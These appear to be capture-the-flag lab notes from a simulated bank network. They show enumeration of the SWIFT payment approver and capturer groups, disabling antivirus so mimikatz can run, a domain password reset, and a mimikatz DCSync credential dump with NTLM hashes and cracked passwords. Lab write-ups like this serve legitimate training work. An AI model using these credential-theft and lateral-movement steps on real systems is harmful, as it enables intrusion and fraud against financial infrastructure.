Turn off AV(realtime-monitoring) by GUI or powershell like always since we need mimikatz.
# Enum
### Payment Approvers
```powershell
net group "Payment Approvers" /domain

The request will be processed at a domain controller for domain bank.thereserve.loc.

Group name     Payment Approvers
Comment

Members

-------------------------------------------------------------------------------
a.holt                   a.turner                 r.davies
s.kemp
The command completed successfully.
```

### Payment Capturers
```powershell
net group "Payment Capturers" /domain

The request will be processed at a domain controller for domain bank.thereserve.loc.

Group name     Payment Capturers
Comment

Members

-------------------------------------------------------------------------------
a.barker                 c.young                  g.watson
s.harding                t.buckley
The command completed successfully.
```

### Users on JMP
2 approvers
```powershell
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/19/2023   9:05 AM                a.holt
d-----        2/19/2023   9:18 AM                a.turner
d-----         6/4/2023  11:59 PM                Administrator
d-----         6/5/2023  12:06 AM                baturu
d-r---       12/12/2018   7:45 AM                Public
d-----         9/7/2022   3:55 PM                THMSetup

PS C:\Users> net user a.holt Password12 /domain
The request will be processed at a domain controller for domain bank.thereserve.loc.

The command completed successfully.
```

The Capture's password are allow replication. Therefore, the AD creds are as same as their Swift web cred. But the approver disallow the replication, reset it then. Get the swift password from JMP's chrome saved passwords.

![[Pasted image 20230605141742.png]]

### Users on WORK1
3 capturers
```powershell
PS C:\Users> dir \\10.200.118.51\c$\Users


    Directory: \\10.200.118.51\c$\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/19/2023   8:37 AM                a.barker fba64e343f0bb56ea95aeb2b5ea418b3
d-----        2/19/2023   8:43 AM                g.watson
d-r---       12/12/2018   7:45 AM                Public
d-----        2/19/2023   8:45 AM                t.buckley Hash NTLM: b8761a00e67b0023797eb3c988c86995
d-----         9/7/2022   3:55 PM                THMSetup

lsadump::dcsync /user:bank\g.watson

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:bank\g.watson
[DC] 'bank.thereserve.loc' will be the domain
[DC] 'BANKDC.bank.thereserve.loc' will be the DC server
[DC] 'bank\g.watson' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : g.watson

** SAM ACCOUNT **

SAM Username         : g.watson
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/14/2023 5:36:09 AM
Object Security ID   : S-1-5-21-3455338511-2124712869-1448239061-1263
Object Relative ID   : 1263

Credentials:
  Hash NTLM: bb3b1e95f9de5864d181eb0119b498c5
    ntlm- 0: bb3b1e95f9de5864d181eb0119b498c5
    lm  - 0: 572a79b619c8a59d17537db01a8100f4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 5103ac301d80e0c134c6ea28828437d2
```

### Users on WORK2
2 capturers
```powershell
dir \\10.200.118.52\c$\Users

Directory: \\10.200.118.52\c$\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/5/2023  12:18 AM                Administrator
d-----         6/5/2023  12:15 AM                baturu
d-----        2/19/2023   8:50 AM                c.young
fbdcd5041c96ddbd82224270b57f11fc
d-r---       12/12/2018   7:45 AM                Public
d-----        2/19/2023   8:51 AM                s.harding 9e4a079d9c28c961d38bd2cca0c9cd5d
d-----         9/7/2022   3:55 PM                THMSetup

```

* 9e4a079d9c28c961d38bd2cca0c9cd5d	NTLM	s.harding:Flamingo1984
* fbdcd5041c96ddbd82224270b57f11fc	NTLM	 c.young:Password!

### Swift
```powershell
PS C:\Users> dir '\\10.200.118.52\c$\Users\s.harding\Documents\Swift\Swift.txt'


    Directory: \\10.200.118.52\c$\Users\s.harding\Documents\Swift


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/19/2023   8:52 AM            303 Swift.txt


PS C:\Users> type '\\10.200.118.52\c$\Users\s.harding\Documents\Swift\Swift.txt'
Welcome capturer to the SWIFT team.

You're credentials have been activated. For ease, your most recent AD password was replicated to the SWIFT application. Please feel free to change this password should you deem it necessary.

You can access the SWIFT system here: http://swift.bank.thereserve.loc
PS C:\Users>
```

-> Back to SWIFT once above done